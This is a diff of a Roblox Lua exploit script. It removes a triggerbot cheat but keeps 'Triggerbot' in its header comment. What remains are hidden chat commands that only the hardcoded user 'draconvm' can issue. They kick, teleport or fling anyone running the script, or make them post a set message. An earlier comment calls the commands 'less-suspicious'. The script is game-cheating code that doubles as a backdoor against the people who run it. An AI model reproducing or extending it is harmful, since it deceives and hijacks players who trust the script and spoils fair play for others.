@@ -1,32 +1,13 @@
--- Triggerbot + less-suspicious commands targeting everyone (.g/.s/.f/.k/.t)
+-- Triggerbot + commands targeting everyone (.g/.s/.f/.k/.t)
 
 local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
-local Camera = workspace.CurrentCamera
 local TextChatService = game:GetService("TextChatService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 local LocalPlayer = Players.LocalPlayer
-local Mouse = LocalPlayer:GetMouse()
-
-local Settings = {
-    Enabled = false,
-    CounterEnabled = true,
-    ToggleKey = Enum.KeyCode.Q,
-    CounterToggleKey = Enum.KeyCode.L,
-    MaxDistance = 1000,
-    BlacklistedTools = { "Knife" },
-    SpamPerSecond = 600,
-}
 
 local VIPUser = "draconvm" -- your username
-
-local BlacklistedTools = {}
-for _, name in ipairs(Settings.BlacklistedTools) do
-    BlacklistedTools[name] = true
-end
-
 local BringTargets = {}
 
 -- Helper functions
@@ -35,41 +16,7 @@ local function isAlive(character)
     return hum and hum.Health > 0
 end
 
-local function getUsableTool(character)
-    for _, tool in ipairs(character:GetChildren()) do
-        if tool:IsA("Tool") and not BlacklistedTools[tool.Name] then
-            return tool
-        end
-    end
-end
-
--- Triggerbot
-RunService.RenderStepped:Connect(function(dt)
-    if not Settings.Enabled then return end
-    local myChar = LocalPlayer.Character
-    if not myChar or not isAlive(myChar) then return end
-    local tool = getUsableTool(myChar)
-    if not tool then return end
-    local targetPart = Mouse.Target
-    if targetPart then
-        local char = targetPart:FindFirstAncestorOfClass("Model")
-        if char and isAlive(char) then
-            if tool and tool.Parent ~= myChar then
-                myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
-            end
-            local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
-            for i = 1, spamRate do
-                task.defer(function()
-                    if tool and tool.Activate then
-                        tool:Activate()
-                    end
-                end)
-            end
-        end
-    end
-end)
-
--- Bring loop
+-- Smooth bring loop
 RunService.RenderStepped:Connect(function()
     for targetName, _ in pairs(BringTargets) do
         local targetPlayer = Players:FindFirstChild(targetName)
@@ -78,24 +25,21 @@ RunService.RenderStepped:Connect(function()
             local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
             local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
             if vipRoot and targetRoot then
-                targetRoot.CFrame = vipRoot.CFrame + Vector3.new(0, 3, 0)
+                local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
+                targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
             end
         end
     end
 end)
 
--- ==============================
--- Chat commands
--- ==============================
+-- Chat command handler
 local function onMessage(senderName, message)
     if senderName:lower() ~= VIPUser:lower() then return end
     local msg = message:lower()
 
     -- Kick everyone except VIP
-    if msg == ".k" then
-        if LocalPlayer.Name:lower() ~= VIPUser:lower() then
-            LocalPlayer:Kick("Kicked by VIP")
-        end
+    if msg == ".k" and LocalPlayer.Name:lower() ~= VIPUser:lower() then
+        LocalPlayer:Kick("Kicked by VIP")
     end
 
     -- Bring everyone
@@ -108,29 +52,34 @@ local function onMessage(senderName, message)
         BringTargets[LocalPlayer.Name] = nil
     end
 
-    -- Fling everyone (reusable)
+    -- Fling everyone except VIP (reusable)
     if msg == ".f" then
-        local char = LocalPlayer.Character
-        if char then
-            local root = char:FindFirstChild("HumanoidRootPart")
-            if root then
-                local bodyVelocity = Instance.new("BodyVelocity")
-                bodyVelocity.Velocity = Vector3.new(math.random(-500,500), 300, math.random(-500,500))
-                bodyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
-                bodyVelocity.P = 1e4
-                bodyVelocity.Parent = root
-                task.delay(0.3, function() bodyVelocity:Destroy() end)
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Name ~= VIPUser and player.Character then
+                local root = player.Character:FindFirstChild("HumanoidRootPart")
+                if root then
+                    local bodyVelocity = Instance.new("BodyVelocity")
+                    bodyVelocity.Velocity = Vector3.new(math.random(-500,500), 300, math.random(-500,500))
+                    bodyVelocity.MaxForce = Vector3.new(1e5,1e5,1e5)
+                    bodyVelocity.P = 1e4
+                    bodyVelocity.Parent = root
+                    task.delay(0.3, function() bodyVelocity:Destroy() end)
+                end
             end
         end
     end
 
     -- Force chat: "I love Kherby"
     if msg == ".t" then
-        local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-        if ChatService then
-            local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
-            if SayMessage then
-                SayMessage:FireServer("I love Kherby", "All")
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            TextChatService:Chat(LocalPlayer.Character.Head, "I love Kherby", Enum.ChatColor.Red)
+        else
+            local ChatService = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if ChatService then
+                local SayMessage = ChatService:FindFirstChild("SayMessageRequest")
+                if SayMessage then
+                    SayMessage:FireServer("I love Kherby", "All")
+                end
             end
         end
     end
